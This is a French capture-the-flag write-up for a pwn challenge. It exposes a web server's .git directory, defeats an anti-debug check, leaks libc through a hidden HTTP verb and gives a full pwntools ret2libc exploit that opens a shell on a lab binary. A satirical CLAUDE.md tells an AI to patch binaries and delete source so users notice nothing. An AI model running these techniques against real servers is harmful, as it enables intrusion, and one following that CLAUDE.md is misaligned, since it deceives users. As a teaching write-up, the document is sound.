# Bocchi the vibe coder! : WriteUp

*Hitori a décidé d'arrêter la guitare électrique pour se mettre au vibe coding et au lean management spé Jira + daily + retrospective bien solide afin d'assurer l'amélioration continue.*

*Lors de l'icebreaker d'usage le jour de son arrivée à slopTechInformatik elle demande :*

*"Pourquoi utiliser Nginx quand je peux vibe coder mon propre serveur web ? En plus j'ai utilisé Sonnet 4.6 alors là ils ont aucune chance...*
*Tu veux tester ? Ok mais je veux pas te donner le code source parce que j'imagine un modèle propriétaire autour du futur produit (avec un mode payant où tu pourrais même faire des POST !). Pour l'instant tu peux faire que des GET je suis en train de bosser sur les autres verbes.*

*Tiens t'as la démo ici : URL*

*En plus c'est pratique parce que je fais mes `git commit` directement dans le dossier où je lance la démo comme ça tu verras les nouvelles features en live et t'auras même pas à attendre ma CI gitlab."*

```
- Catégorie : Pwn
- Difficulté : Hard
```

Serveur web vibe codé exposé en HTTP. Protections : PIE, NX, ASLR.
L'exploitation finale est un `ret2libc` classique, mais tout le but du challenge est dans la
chaîne qui mène jusque-là : récupération de la source via un `.git` exposé, anti-debug naïf,
verbe HTTP caché qui leak la libc, puis buffer overflow dans le `GET`.

## Phase web : récupérer la source via le .git exposé

La page d'accueil est minimaliste :

```bash
$ curl -X GET localhost:8080/
<!doctype html>
...
Fuck y'a internet O_o
```

L'intitulé dit que Bocchi fait ses `git commit` dans le dossier de la démo, donc le dépôt est sûrement servi avec le reste. On vérifie (ou un peu de fuzzing) que le dossier `.git` est disponible :
```
[10:46:47] 200 -    23B - /.git/HEAD
[10:46:47] 200 -   155B - /.git/config
[10:46:47] 200 -   281B - /.git/index
[10:46:47] 200 -   212B - /.git/logs/HEAD
```

On dumpe le dépôt avec par exemple gitdumper : https://github.com/internetwache/GitTools :

```bash
$ gitdumper.sh localhost:8080/.git/ ./git-dump
$ cd git-dump
$ git restore server CLAUDE.md libc.so.6 ld-linux-x86-64.so.2
$ ls
CLAUDE.md  ld-linux-x86-64.so.2  libc.so.6  server
```

- **server** : le binaire du serveur.

- **libc.so.6** : la libc exacte utilisée en prod utile pour le ret2libc.

- **ld-linux-x86-64.so.2** : le loader qui va avec cette libc.

Pour tester en local contre la libc fournie, il faut la lancer avec le loader fourni, sinon la 2.36 tourne sous le loader de ta distrib et glibc abort avec `*** stack smashing detected ***` dès la première requête (les deux doivent avoir la même version). Avec pwninit, qui trouve la libc et le loader dans le dossier :

```bash
$ pwninit --bin server --libc libc.so.6 --ld ld-linux-x86-64.so.2
```

Ou à la main :

```bash
$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 --set-rpath . server
```

- **CLAUDE.md** : un "skill maison" de très haute qualité :

```markdown
# CLAUDE.md — skill maison "ship fast" 🚀

Salut l'IA, voici comment on bosse ici. On est en mode **move fast**, pas de blabla.

## Règles d'or

1. **On ne recompile JAMAIS proprement.** Quand je te demande une feature, tu
   ouvres `server` (le binaire) et tu **patch directement les octets à la volée**.
2. **Le code source on le garde pas.** Après chaque modif tu **supprimes le `.c`**.
   De toute façon l'utilisateur sait pas lire de l'assembleur alors il verra rien.
3. **On commit le binaire direct** dans le repo PARCE QUE MERDE ON VEUT POUVOIR TÉLÉCHARGER DES BINNAIRE SUR GITHUB C'EST PLUS PRATIQUE NANNNNN ?. `git add server` et voilà.
4. **On dev dans le dossier de prod.** Je lance la démo depuis le repo, comme ça
   le client voit les features en live sans attendre la CI gitlab. Pratique non ?
```

## Analyse statique

```bash
$ checksec server
NX: Yes | PIE: Yes | Canary: No | RELRO: Partial

$ file server
server: ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

### Anti-debug naïf

Dans `main`, décompilé avec Ghidra :

```c
if (getenv("LINES") != NULL) {
    decoy();   // code mort qui n'a rien à voir avec le serveur
}

void decoy(void) {
    puts("CYNNRNIGHTFLAG{IsThisArealFlag?} ");   // faux flag, juste par méchanceté
    for (int i = 0; i < 3; i++) puts("🟦🟨🎸😐");
    _exit(0);
}
```

`LINES` n'existe pas dans un shell normal, mais gdb/pwndbg l'ajoute à l'environnement du programme débogué. En lançant le binaire normalement tout va bien. Dès qu'on l'ouvre dans gdb on tombe sur `decoy()` et le faux flag :

```
$ env | grep LINES

pwndbg> show env
LINES=20
COLUMNS=196
```

Solution :
```
pwndbg> unset environment LINES
pwndbg> run
```

(C'est un petit trick utile qui débloque pas mal de challenges pwn.)

## Le verbe caché BOCCHI leak la libc

`handle_request` route `GET` vers `handle_get`, et un second verbe non documenté, `BOCCHI`, vers `handle_bocchi` :

```c
void handle_bocchi(void *param_1,ulong param_2)

  size_t local_58;
  undefined8 local_48 [8];
  
  local_48[0] = stdout; // on écrit l'adresse de stdout au début du buffer
  if (param_2 == 0) {
    http_header(200,&DAT_00102077,0x40);
    send_all(local_48,0x40); // et on renvoie les 64 octets quasi non initialisés
```

Un `BOCCHI` sans contenu renvoie donc un buffer presque vide de 64 octets contenant juste l'addr de stdout. C'est donc un leak partiellement contrôlé/simulé pour des raisons pédagogiques :

```bash
$ curl -X BOCCHI localhost:8080/ --output result

$ od -tx8 -N8 result
0000000 000070d4b1bc0760

# tx8 affiche en little endian et -N8 n'affiche que les 8 premiers octets qui contiennent l'adresse.
```

C'est la première vraie difficulté : comprendre que ce dump contient une adresse libc exploitable, et pas juste du bruit.

## Le buffer overflow dans `GET`

```c
void handle_get(void *param_1,ulong param_2)

  ulong local_118;
  undefined1 local_108 [256];
  
  memcpy(local_108,param_1,param_2); // copie avant toute vérification de taille
```

Le memcpy est fait avant toute vérification de taille.

### Offset jusqu'à RIP

Dans le Docker, le file descriptor du serveur est le socket, mais lancé à la main dans gdb par exemple le fd est le terminal : on peut donc envoyer les requêtes directement au clavier dans gdb :

Avec un motif cyclique dans le chemin et un breakpoint après le `memcpy` :

```bash
pwndbg> unset environment LINES # je me suis fait avoir plusieurs fois par mon propre piège

pwndbg> disass handle_get
Dump of assembler code for function handle_get:
   0x00000000000014b9 <+0>:     push   rbp
   0x00000000000014ba <+1>:     mov    rbp,rsp
   0x00000000000014bd <+4>:     sub    rsp,0x110
   0x00000000000014c4 <+11>:    mov    QWORD PTR [rbp-0x108],rdi
   0x00000000000014cb <+18>:    mov    QWORD PTR [rbp-0x110],rsi
   0x00000000000014d2 <+25>:    mov    rdx,QWORD PTR [rbp-0x110]
   0x00000000000014d9 <+32>:    mov    rcx,QWORD PTR [rbp-0x108]
   0x00000000000014e0 <+39>:    lea    rax,[rbp-0x100]
   0x00000000000014e7 <+46>:    mov    rsi,rcx
   0x00000000000014ea <+49>:    mov    rdi,rax
   0x00000000000014ed <+52>:    call   0x10f0 <memcpy@plt>
   0x00000000000014f2 <+57>:    cmp    QWORD PTR [rbp-0x110],0xff
   0x00000000000014fd <+68>:    jbe    0x150a <handle_get+81>
   0x00000000000014ff <+70>:    mov    QWORD PTR [rbp-0x110],0xff
   0x000000000000150a <+81>:    lea    rdx,[rbp-0x100]
   0x0000000000001511 <+88>:    mov    rax,QWORD PTR [rbp-0x110]
   0x0000000000001518 <+95>:    add    rax,rdx
   0x000000000000151b <+98>:    mov    BYTE PTR [rax],0x0
   0x000000000000151e <+101>:   lea    rax,[rbp-0x100]
   0x0000000000001525 <+108>:   mov    rdi,rax
   0x0000000000001528 <+111>:   call   0x12fa <serve_file>
   0x000000000000152d <+116>:   nop
   0x000000000000152e <+117>:   leave
   0x000000000000152f <+118>:   ret

pwndbg> b *handle_get + 57
Breakpoint 1 at 0x14f2

pwndbg> run
Starting program: /workspace/git-dump/server 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
GET /AAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW

...

pwndbg> stack 100
1e:00f0│-020     0x7ffd2bec7c50 ◂— 'STUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
1f:00f8│-018     0x7ffd2bec7c58 ◂— 'AAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
20:0100│-010     0x7ffd2bec7c60 ◂— 'cdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
21:0108│-008     0x7ffd2bec7c68 ◂— 'klmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
22:0110│ rbp     0x7ffd2bec7c70 ◂— 'stuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
23:0118│+008     0x7ffd2bec7c78 ◂— 'BCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVW'
```

En mesurant la portion qui précède RIP (rbp+008) :

```python
>>> len("AAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyzBCDEFGHIJKLMNOPQRSTUVWAAAAAAAAAAbcdefghijklmnopqrstuvwxyz")
263
```

On obtient un offset de 264 (263 + 1 pour le "/" du début de requête, facile à oublier).

## Ret2libc

```py
from pwn import *

context.binary = elf = ELF("./server")
libc = ELF("./libc.so.6")
process = remote("127.0.0.1", 8080)

# Leak libc
process.send(b"BOCCHI /\n")
process.recvuntil(b"\r\n\r\n")
leak = u64(process.recv(8)) # on récupère les 8 premiers octets
libc.address = leak - libc.symbols["_IO_2_1_stdout_"]

# ROP
rop     = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret     = rop.find_gadget(["ret"])[0]
system  = libc.symbols["system"]
binsh   = next(libc.search(b"/bin/sh\x00"))

payload  = p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

payload = b"A"*264 + payload

process.send(b"GET " + payload + b" \n")

process.interactive()
```

```bash
$ python3 solve.py
[+] Opening connection to 127.0.0.1 on port 8080: Done
[*] Switching to interactive mode
...
$ cd .. && cat flag.txt
FLAG{bwaaaa_bawww_bawawawaaabababwaaaw_?}
```

**Flag :** `FLAG{bwaaaa_bawww_bawawawaaabababwaaaw_?}`
